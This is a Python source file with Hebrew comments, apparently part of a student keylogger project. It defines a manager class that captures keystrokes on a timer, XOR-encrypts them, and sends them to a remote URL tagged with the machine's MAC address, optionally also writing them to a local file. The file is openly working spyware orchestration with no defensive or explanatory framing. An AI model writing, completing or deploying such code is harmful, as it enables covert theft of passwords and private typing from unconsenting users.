from KeyLoggerService import KeyLoggerService
from network_writer import NetworkWriter
from FileWriter import FileWriterWithTime
from Encryptor import XorEncryptor
from Get_mac import get_mac_address
from time import sleep



class KeyLoggerManager:
    """ניהול התוכנה בעזרת קבצי העזר"""

    def __init__(self,timer: int, encryption_key: str | int, url: str, write_to_file=False):
        """קבלת טיימר לבקשות הנתונים שהוקלדו"""
        self.timer = timer
        self.running = None
        self.logger = KeyLoggerService()
        self.encryption_key = encryption_key
        self.encryptor = XorEncryptor()
        self.network_writer = NetworkWriter(url)
        self.file_writer = FileWriterWithTime()
        self.write_to_file = write_to_file


    def start(self):
        """מתחיל מעקב והרצת הקבצים הנדרשים"""
        self.running = True
        self.logger.start_logging() # תחילת מעקב
        while self.running:
            sleep(self.timer) # המתנה לפי פרק הזמן המוגדר
            get_logger = self.logger.get_logged_keys() # קבלת נתונים
            if get_logger: # אם היו הקלדות
                logger_encrypt = self.encryptor.encrypt(get_logger, self.encryption_key) # הצפנה
                self.network_writer.send_data(logger_encrypt, get_mac_address()) # שליחה לשרת
                if self.write_to_file:
                    self.file_writer.send_data(logger_encrypt, 'Key logger.txt') # הדפסה לקובץ

    def stop(self):
        """עצירת המעקב"""
        self.running = False
        self.logger.stop_logging()

# הושלם